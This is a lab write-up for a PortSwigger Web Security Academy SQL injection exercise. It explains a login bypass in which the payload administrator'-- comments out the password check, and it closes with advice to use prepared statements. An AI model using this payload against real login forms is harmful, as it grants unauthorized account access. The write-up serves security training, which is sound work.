# PortSwigger SQL Injection — Login Bypass

- Platform: PortSwigger Web Security Academy
- Category: SQL injection
- Difficulty: Apprentice
- Goal: log in as `administrator`
- Result: solved

## Summary

The login form is vulnerable to SQL injection in the username field. The backend likely uses a query shaped like:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

Injecting a comment after the administrator username removes the password predicate.

## Payload

Username:

```text
administrator'--
```

Password:

```text
anything
```

Resulting logic:

```sql
WHERE username = 'administrator'--' AND password = 'anything'
```

The password check is commented out, so the application logs in as `administrator`.

## Verification

The response redirected to:

```text
/my-account?id=administrator
```

The lab homepage then displayed the solved marker.

## Defensive takeaway

Authentication queries must use prepared statements and should never be built with string concatenation. MFA and login anomaly detection are useful defense-in-depth, but they do not fix the injection flaw.